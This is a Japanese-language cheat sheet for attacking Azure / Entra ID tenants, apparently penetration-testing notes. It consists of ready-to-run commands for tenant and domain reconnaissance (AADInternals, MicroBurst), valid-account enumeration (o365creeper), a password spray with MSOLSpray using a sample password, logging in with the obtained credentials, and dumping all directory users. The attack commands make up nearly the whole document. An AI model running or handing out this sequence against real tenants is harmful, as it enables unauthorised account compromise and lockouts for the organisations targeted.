# AzureCloud-EntraID

### ユーザ名（プリンシパル名・メールアドレス）からのテナント情報の取得
```
# AADInternals

> Get-AADIntLoginInformation -UserName admin@microsoft.onmicrosoft.com
```

### ドメインからのテナントIDの取得
```
# AADInternals

> Get-AADIntTenantID -Domain microsoft.onmicrosoft.com
```

### Entra IDとして機能するメールアドレスの特定
```
# o365creeper
# C:\temp\users.txt : ユーザ名のリスト

> C:\Python27\python.exe .\o365creeper.py -f C:\temp\users.txt -o C:\temp\validusers.txt
```

### ベース文字列からのサブドメイン検索
```
# MicroBurst

> Invoke-EnumerateAzureSubDomains -Base microsoft -Verbose
```

### パスワードスプレー攻撃
```
# MSOLSpray
# C:\temp\validemails.txt : ユーザ名のリスト

> Invoke-MSOLSpray -UserList C:\temp\validusers.txt -Password P@ssw0rd -Verbose
```

### AzureADモジュールでのログオン
```
> $passwd = ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("test@contoso.onmicrosoft.com", $passwd)
> Connect-AzureAD -Credential $creds
```

### 全ユーザの列挙
```
> Get-AzureADUser -All $true
```

